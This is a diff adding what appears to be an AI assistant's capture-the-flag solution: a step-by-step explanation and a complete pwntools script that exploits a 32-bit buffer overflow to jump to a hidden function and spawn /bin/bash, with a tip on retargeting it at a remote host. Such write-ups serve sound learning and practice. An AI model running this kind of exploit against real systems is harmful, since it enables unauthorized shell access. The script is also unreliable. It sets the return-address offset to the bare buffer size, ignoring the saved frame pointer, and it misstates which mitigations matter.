@@ -1,0 +1,89 @@
+To solve this challenge using `pwntools`, you can exploit the buffer overflow vulnerability in the `vulnerable_function` to overwrite the return address and redirect execution to the `not_called` function, which executes a shell (`/bin/bash`). Below are the steps and the corresponding code to solve the challenge:
+
+---
+
+### Steps to Solve the Challenge:
+
+1. **Analyze the Binary**:
+   - The binary is a 32-bit ELF file.
+   - The `vulnerable_function` has a buffer overflow vulnerability because it reads up to 256 bytes (`0x100`) into a buffer of size 136 bytes (`buf[136]`).
+   - The `not_called` function is not called anywhere in the program, but it contains a `system("/bin/bash")` call, which can be used to spawn a shell.
+
+2. **Find the Offsets**:
+   - Calculate the offset to overwrite the return address in the stack. This can be done using tools like `gdb` or by sending a pattern and identifying where the overwrite occurs.
+
+3. **Craft the Exploit**:
+   - Use the offset to overwrite the return address with the address of the `not_called` function (`0x080484A4`).
+
+4. **Use `pwntools` to Automate the Exploit**:
+   - Write a Python script using `pwntools` to send the payload and interact with the shell.
+
+---
+
+### Exploit Code:
+
+Here is the Python script using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary
+binary = './challenge'  # Replace with the actual binary name
+elf = ELF(binary)
+
+# Addresses
+not_called_addr = elf.symbols['not_called']  # Address of the not_called function
+
+# Offset to overwrite the return address
+offset = 136  # Found from analysis (size of buf)
+
+# Create the payload
+payload = b'A' * offset  # Fill the buffer
+payload += p32(not_called_addr)  # Overwrite return address with not_called address
+
+# Start the process
+p = process(binary)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code:
+
+1. **Binary Setup**:
+   - The `ELF` object from `pwntools` is used to load the binary and extract symbols like `not_called`.
+
+2. **Payload Construction**:
+   - The payload consists of:
+     - `b'A' * offset`: Fills the buffer up to the return address.
+     - `p32(not_called_addr)`: Overwrites the return address with the address of the `not_called` function. `p32` ensures the address is packed in little-endian format (required for 32-bit binaries).
+
+3. **Process Interaction**:
+   - `process(binary)`: Starts the binary locally.
+   - `sendline(payload)`: Sends the crafted payload to the binary.
+   - `interactive()`: Allows you to interact with the shell spawned by the exploit.
+
+---
+
+### Testing the Exploit:
+
+1. Run the script:
+   ```bash
+   python3 exploit.py
+   ```
+
+2. If successful, you should get a shell (`/bin/bash`) and be able to execute commands.
+
+---
+
+### Notes:
+
+- If the binary is running on a remote server, replace `process(binary)` with `remote('host', port)` and provide the host and port of the server.
+- Ensure that the binary is not protected by modern mitigations like ASLR, NX, or stack canaries. If these protections are enabled, additional steps will be required to bypass them.
+
+Let me know if you need further clarification!
